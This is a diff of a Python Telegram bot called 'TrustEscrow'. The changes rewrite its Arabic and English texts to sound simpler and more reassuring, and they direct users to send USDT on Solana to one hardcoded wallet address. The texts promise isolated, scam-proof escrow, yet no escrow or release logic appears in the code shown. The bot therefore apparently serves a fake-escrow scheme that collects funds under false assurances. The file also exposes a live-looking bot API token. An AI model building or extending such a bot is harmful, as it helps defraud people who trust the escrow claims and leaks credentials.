@@ -1,33 +1,34 @@
 import telebot
 from telebot import types
 
+# ضع التوكن الخاص بك هنا
 API_TOKEN = '8806803636:AAGx0ck3UwL594FLx_G2BaFfwwXDux7d1v8'
 bot = telebot.TeleBot(API_TOKEN)
 
 ADMIN_USERNAME = "@HE_5TE"
 WALLET_ADDRESS = "D5nB2WhVgKDpS2N3Zx7uXFNV1zMqXiBh777XnQFx4kpu"
 
-# القاموس الثنائي للغة
+# القاموس النهائي: نصوص بسيطة ومباشرة للمبتدئين
 TEXTS = {
     'ar': {
         'welcome': "🛡️ *أهلاً بك في TrustEscrow*\n\nنظام وساطة رقمي آمن. نستخدم محفظة *Phantom* مشفرة للأمان العالي.",
-        'main_menu': "اختر الإجراء المطلوب:",
+        'main_menu': "كيف يمكنني مساعدتك اليوم؟",
         'start_btn': "🚀 البدء بصفقة جديدة",
         'terms_btn': "📄 شروط الأمان",
-        'service_prompt': "📦 ما هي الخدمة أو السلعة؟",
+        'service_prompt': "📦 ما هي الخدمة أو السلعة التي تتاجر بها؟",
         'partner_prompt': "👤 أدخل يوزر الطرف الآخر:",
-        'amount_prompt': "💰 أدخل المبلغ (USDT):",
-        'summary': "✅ *تم فتح الطلب بنجاح!*\n\nالخدمة: {s}\nالطرف الآخر: {p}\nالمبلغ: {a}\n\n⚠️ *تنبيه هام:* \nمحفظتنا هي *Phantom* وتستقبل USDT على شبكة **Solana (SPL)** فقط.\nإرسال عملات عبر شبكات أخرى (مثل TRC20) سيؤدي لضياع أموالك فوراً!",
+        'amount_prompt': "💰 كم مبلغ الصفقة بالـ USDT؟",
+        'summary': "✅ *تم فتح الطلب بنجاح!*\n\nالخدمة: {s}\nالطرف الآخر: {p}\nالمبلغ: {a} USDT\n\n⚠️ *تنبيه هام جداً:*\nمحفظتنا تستقبل USDT على شبكة **Solana (SPL)** فقط.\nإذا أرسلت على شبكة أخرى (مثل TRC20)، ستضيع أموالك نهائياً!",
     },
     'en': {
-        'welcome': "🛡️ *Welcome to TrustEscrow*\n\nSecure digital escrow. We use *Phantom* wallet for high-security transactions.",
-        'main_menu': "Please choose an action:",
-        'start_btn': "🚀 Start New Escrow",
-        'terms_btn': "📄 Safety Terms",
-        'service_prompt': "📦 What is the service/item?",
-        'partner_prompt': "👤 Enter partner's username:",
-        'amount_prompt': "💰 Enter amount (USDT):",
-        'summary': "✅ *Order Created Successfully!*\n\nService: {s}\nPartner: {p}\nAmount: {a}\n\n⚠️ *Critical Warning:* \nOur wallet is *Phantom* and accepts USDT on **Solana (SPL)** network ONLY.\nSending via other networks (like TRC20) will result in permanent loss!",
+        'welcome': "🛡️ *Welcome to TrustEscrow*\n\nA safe and simple way to trade online. We help you trade safely without worrying about scams.",
+        'main_menu': "How can I help you today?",
+        'start_btn': "🚀 Start a new trade",
+        'terms_btn': "📄 Safety Rules",
+        'service_prompt': "📦 What are you trading?",
+        'partner_prompt': "👤 Enter the other person's username:",
+        'amount_prompt': "💰 How much money (USDT) is the trade?",
+        'summary': "✅ *Order Created!*\n\nService: {s}\nTrading with: {p}\nAmount: {a} USDT\n\n⚠️ *IMPORTANT WARNING:*\nOur wallet ONLY uses the **Solana (SPL)** network.\nIf you send money using any other network (like TRC20 or ERC20), the money will be lost forever!",
     }
 }
 
@@ -50,7 +51,6 @@ def show_main_menu(message, lang, edit=False, message_id=None):
     markup = types.InlineKeyboardMarkup(row_width=1)
     markup.add(types.InlineKeyboardButton(TEXTS[lang]['start_btn'], callback_data="new_order"),
                types.InlineKeyboardButton(TEXTS[lang]['terms_btn'], callback_data="terms"))
-    
     if edit:
         bot.edit_message_text(TEXTS[lang]['main_menu'], message.chat.id, message_id, reply_markup=markup)
     else:
@@ -60,11 +60,11 @@ def show_main_menu(message, lang, edit=False, message_id=None):
 def show_terms(call):
     lang = user_data[call.message.chat.id]['lang']
     terms_text = {
-        'ar': "📜 *شروط وأمان TrustEscrow*\n\n1. الأموال تُحفظ في محفظة Phantom مستقلة.\n2. يتم التحويل للبائع بعد تأكيدك.\n3. نستخدم شبكة *Solana* لضمان السرعة.",
-        'en': "📜 *TrustEscrow Safety Terms*\n\n1. Funds held in an isolated Phantom wallet.\n2. Released after your confirmation.\n3. We use *Solana* network for speed."
+        'ar': "📜 *شروط وأمان TrustEscrow*\n\n1. الأموال تُحفظ في محفظة Phantom مستقلة.\n2. يتم التحويل للبائع بعد تأكيدك.\n3. نستخدم شبكة *Solana* لسرعتها وتكلفتها المنخفضة.",
+        'en': "📜 *TrustEscrow Safety Rules*\n\n1. Money is held in a secure Phantom wallet.\n2. Money is sent to the seller after you confirm.\n3. We use the *Solana* network because it is fast and cheap."
     }
     markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("📖 دليل المحفظة (Phantom/Solana)", callback_data="wallet_guide"))
+    markup.add(types.InlineKeyboardButton("📖 دليل المحفظة", callback_data="wallet_guide"))
     markup.add(types.InlineKeyboardButton("🔙 عودة للقائمة الرئيسية", callback_data="back_to_menu"))
     bot.edit_message_text(terms_text[lang], call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
 
@@ -77,14 +77,16 @@ def back_to_menu(call):
 def show_wallet_guide(call):
     lang = user_data[call.message.chat.id]['lang']
     guide_text = {
-        'ar': ("📖 *دليل محفظة Phantom وشبكة Solana*\n\n"
-               "1️⃣ محفظتنا هي *Phantom* وتستقبل USDT حصراً على شبكة *Solana (SPL)*.\n"
-               "2️⃣ [شرح فتح محفظة Phantom](https://www.youtube.com/results?search_query=how+to+setup+phantom+wallet)\n\n"
-               "⚠️ *تنبيه:* لا ترسل عبر TRC20 أو ERC20 أبداً. فقط شبكة Solana!"),
-        'en': ("📖 *Phantom Wallet & Solana Network Guide*\n\n"
-               "1️⃣ Our wallet is *Phantom* and accepts USDT on *Solana (SPL)* ONLY.\n"
-               "2️⃣ [How to setup Phantom](https://www.youtube.com/results?search_query=how+to+setup+phantom+wallet)\n\n"
-               "⚠️ *Warning:* Never send via TRC20 or ERC20. Solana network only!")
+        'ar': ("📖 *دليل فتح محفظة رقمية*\n\n"
+               "لإتمام الصفقة، تحتاج لمحفظة تدعم شبكة *Solana*.\n\n"
+               "1️⃣ *بينانس (للمبتدئين):*\n[شرح بينانس](https://www.youtube.com/results?search_query=شرح+فتح+حساب+بينانس)\n"
+               "2️⃣ *تراست واليت (تحكم كامل):*\n[شرح تراست واليت](https://www.youtube.com/results?search_query=شرح+إنشاء+محفظة+تراست+واليت)\n\n"
+               "⚠️ *تنبيه:* لا ترسل عبر TRC20 أو ERC20. فقط شبكة **Solana (SPL)**!"),
+        'en': ("📖 *Digital Wallet Setup Guide*\n\n"
+               "To trade, you need a wallet that supports the *Solana* network.\n\n"
+               "1️⃣ *Binance (Easy):*\n[Watch Binance Tutorial](https://www.youtube.com/results?search_query=how+to+create+a+binance+account)\n"
+               "2️⃣ *Trust Wallet (Full Control):*\n[Watch Trust Wallet Tutorial](https://www.youtube.com/results?search_query=how+to+create+a+trust+wallet)\n\n"
+               "⚠️ *WARNING:* Do not send via TRC20 or ERC20. Only use the **Solana (SPL)** network!")
     }
     markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 رجوع", callback_data="terms"))
     bot.edit_message_text(guide_text[lang], call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
